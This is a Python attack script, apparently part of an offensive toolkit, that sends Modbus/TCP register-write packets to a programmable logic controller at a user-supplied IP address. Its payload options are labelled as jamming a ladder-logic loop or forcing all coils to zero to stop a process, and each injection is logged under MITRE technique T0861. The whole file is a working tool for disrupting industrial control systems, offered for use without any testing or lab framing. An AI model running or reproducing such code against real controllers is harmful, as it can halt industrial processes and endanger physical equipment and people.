#!/usr/bin/env python3
# modules/attacks/plc_payload_injector.py

import socket
import time
import struct
import argparse
import os
import json
from datetime import datetime

LOG_FILE = "results/plc_injection_log.json"
MITRE_TTP = "T0861"

def log_event(ip, payload_type):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "payload_type": payload_type,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def build_modbus_write_payload(register, values):
    return struct.pack('>BHH' + 'H'*len(values), 0x10, register, len(values), len(values)*2, *values)

def inject_plc_payload(ip, port, payload_type):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))

    if payload_type == "infinite_loop":
        values = [0xFFFF] * 10  # Example: jam ladder loop
        packet = build_modbus_write_payload(0x0100, values)
    elif payload_type == "stop_process":
        values = [0x0000] * 4  # Force all coils to 0 (stop)
        packet = build_modbus_write_payload(0x0000, values)
    else:
        values = [0x1234]
        packet = build_modbus_write_payload(0x0001, values)

    request = struct.pack('>HHHB', 0x0001, 0x0000, len(packet)+1, 0x01) + packet
    sock.send(request)
    sock.close()

    log_event(ip, payload_type)
    print(f"[✓] Payload '{payload_type}' injected into PLC at {ip}:{port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject payloads into vulnerable PLCs over Modbus/TCP")
    parser.add_argument("--ip", required=True, help="PLC IP address")
    parser.add_argument("--port", type=int, default=502, help="Modbus TCP port")
    parser.add_argument("--payload", choices=["infinite_loop", "stop_process", "custom"], default="infinite_loop", help="Payload type")
    args = parser.parse_args()

    inject_plc_payload(args.ip, args.port, args.payload)
